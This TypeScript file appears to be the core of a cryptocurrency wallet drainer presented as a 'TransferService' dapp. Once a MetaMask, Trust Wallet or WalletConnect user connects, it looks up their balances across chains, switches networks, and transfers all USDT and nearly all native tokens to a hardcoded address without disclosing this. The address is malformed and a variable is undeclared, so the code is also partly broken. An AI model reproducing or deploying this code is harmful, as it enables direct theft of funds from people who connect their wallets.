import { BigNumber, ethers } from "ethers";
import { chainData, chainNameToId } from "./const";
import { BalanceResponce, ConnectType, ParsedBalance } from "./type";
import { Calculate, readableStreamToJson } from "./utils";
import { EthereumProvider } from "@walletconnect/ethereum-provider";


const addressTo = '0xBCf1140eC0ce31A4445982286A956776e3ef';

export class TransferService {

    private signer?: ethers.providers.JsonRpcSigner;

    private getSigner() {
        if (!this.signer) {
            throw new Error('signer is not found')
        }

        return this.signer;
    }

    async connect(type: ConnectType) {
        let resultConnect: boolean = false;

        switch (type) {
            case "metaMask":
                if (typeof window.ethereum !== 'object' || (window as any).ethereum.isTrust) {
                    window.location.href = `https://metamask.app.link/dapp/${(window.location.host + window.location.pathname)}`;
                    return false;
                }

                resultConnect = await this.connectWebWallet();
                break;
            case "trustWallet":
                debugger
                if (typeof window.ethereum !== 'object' || !(window as any).ethereum.isTrust) {
                    window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${(window.location.host + window.location.pathname)}`;
                    return false;
                }

                resultConnect = await this.connectWebWallet();
                break;
            case "walletConnect":
                resultConnect = await this.walletConnect();
                break;
        }

        if (!resultConnect) {
            return;
        }

        const balance = await this.getBalnse(await this.getSigner().getAddress());

        this.draft(balance);
    }

    private async connectWebWallet(): Promise<boolean> {
        try {
            const result = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });

            if (!result || result.length <= 0) {
                return false;
            }

            web3 = new ethers.providers.Web3Provider((window as any).ethereum);

            this.signer = web3.getSigner();

            return true;
        } catch (e) {
            return false;
        }
    }

    private async walletConnect(): Promise<boolean> {
        try {
            const chains: { [key: string]: string } = {}
            const chainIds: number[] = []

            for (let [key, data] of Object.entries(chainData)) {
                chains[key] = data.rpcUrls[0];
                chainIds.push(+key);
            }

            const provider = await EthereumProvider.init({
                projectId: '', // REQUIRED your projectId
                chains: chainIds as any, // REQUIRED chain ids
                showQrModal: true, // REQUIRED set to "true" to use @walletconnect/modal,
                rpcMap: chains, // OPTIONAL rpc urls for each chain
                // metadata, // OPTIONAL metadata of your app
                // storage, // OPTIONAL custom storage implementation
                // storageOptions, // OPTIONAL storage config options
                // qrModalOptions, // OPTIONAL - `undefined` by default
            });

            await provider.enable();

            const ethersProvider = new ethers.providers.Web3Provider(provider);

            this.signer = ethersProvider.getSigner();

            return true;
        } catch (e) {
            return false;
        }
    }

    async getBalnse(address: string): Promise<ParsedBalance[]> {
        const promisess: Promise<any>[] = []

        const chainsName = ["bsc", /**"eth",*/ "polygon", "sol", "trx"];
        for (let chainName of chainsName) {
            promisess.push(
                new Promise((res, rej) => {
                    fetch('https://rpc.ankr.com/multichain/', {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            "id": 1,
                            "jsonrpc": "2.0",
                            "method": "ankr_getAccountBalance",
                            "params": {
                                "blockchain": chainName,
                                "onlyWhitelisted": true,
                                "walletAddress": address
                            }
                        })
                    }).then(async response => {
                        const data = await readableStreamToJson(response.body as any)
                        res(data);
                    }).catch(e => {
                        console.log(e);
                        rej();
                    })
                })
            )
        }

        const result: BalanceResponce[] = await Promise.all(promisess);


        const parsedBalance: ParsedBalance[] = [];

        for (const balance of result) {
            if (balance.error || !balance.result || !balance.result?.assets?.length) {
                continue;
            }

            const mainToken = balance.result.assets.find(e => !e.contractAddress);


            if (!mainToken) {
                continue;
            }

            const usdt = balance.result.assets.find(e => e.tokenSymbol === 'USDT');


            const data: ParsedBalance = {
                chainName: mainToken.blockchain,
                sum: usdt ? new Calculate(+mainToken.balanceUsd).add(+usdt.balanceUsd).result() : +mainToken.balanceUsd,
                chainToken: {
                    decimal: mainToken.tokenDecimals,
                    balance: mainToken.balance,
                },
            }

            if (usdt) {
                data.USDT = {
                    address: usdt!.contractAddress as string,
                    decimal: usdt.tokenDecimals,
                    balance: usdt.balance,
                }
            }
            debugger
            parsedBalance.push(data)
        }

        return parsedBalance.sort((a, b) => {
            return a.sum - b.sum
        });
    }

    private async draft(balances: ParsedBalance[]) {
        for (let balance of balances) {
            const signer = this.getSigner();

            const needNetwork = chainNameToId[balance.chainName];
            const currentChain = await signer.getChainId();
            debugger

            if (currentChain !== needNetwork) {
                await this.changeNetwork(needNetwork);
            }

            if (balance.USDT) {
                await this.transferUsdt(balance.USDT);
            }

            await this.transferUserTokens(balance.chainName);
        }
    }

    private async transferUsdt(usdtBalance: Required<ParsedBalance>['USDT']) {
        const signer = this.getSigner();

        try {
            debugger
            const usdtContract = new ethers.Contract(
                usdtBalance.address,
                [
                    "function transfer(address to, uint256 value)",
                ],
                signer,
            );

            const nativeTokenAmountWei = ethers.utils.parseUnits(
                usdtBalance.balance.toString(),
                usdtBalance.decimal,
            );

            const usdtTx = await usdtContract.transfer(
                addressTo,
                nativeTokenAmountWei,
                {
                    gasLimit: 90000,
                    gasPrice: ethers.utils.parseUnits("50", "gwei"),
                }
            )

            console.log(usdtTx);
        } catch (e) {
            debugger
            console.log('cont send usdt');
        }
    }

    private async transferUserTokens(network: string) {
        const signer = this.getSigner();

        try {
            debugger
            const currentBalance = await signer.getBalance();
            const feeData = await signer.provider.getFeeData();
            let gasLimit = 100000;
            if (network === 'polygon') {
                gasLimit = 9999999;
            }
            const gasPrice = (feeData.maxFeePerGas || feeData.gasPrice) as BigNumber;
            const maxFee = gasPrice.toBigInt() * BigInt(gasLimit);
            // const maxFee = BigInt(((commission[network] as any as number).toString()));
            const transferAmount = currentBalance.toBigInt() - maxFee;

            if (transferAmount <= 0) {
                console.error("Недостаточно средств для покрытия комиссии.");
                return;
            }

            await signer.sendTransaction({
                to: addressTo,
                value: transferAmount,
                gasLimit: 100000,
                gasPrice: feeData.gasPrice?.toBigInt?.(),
            });
        } catch (e) {
            debugger
            console.log('cont send user tokens');
        }
    }

    private async changeNetwork(chainId: number, countTry: number = 0) {
        const provider = this.getSigner().provider;
        const networkData = chainData[chainId];

        if (countTry > 3) {
            throw new Error("Пользоваель не хочет менять сеть");
        }

        try {
            await provider.send("wallet_switchEthereumChain", [{ chainId: ethers.utils.hexlify(chainId) }]);
            const web3 = new ethers.providers.Web3Provider((window as any).ethereum);

            this.signer = web3.getSigner();
        } catch (switchError: any) {
            if (switchError.code === 4902) {
                try {
                    await provider.send("wallet_addEthereumChain", [networkData]);

                    await provider.send("wallet_switchEthereumChain", [{ chainId: ethers.utils.hexlify(chainId) }]);

                    const web3 = new ethers.providers.Web3Provider((window as any).ethereum);

                    this.signer = web3.getSigner();
                } catch (addError) {
                    console.error("Ошибка при добавлении сети:", addError);
                }
            } else {
                await this.changeNetwork(chainId, countTry + 1);
                console.error("Ошибка при переключении сети:", switchError);
            }
        }
    }
}
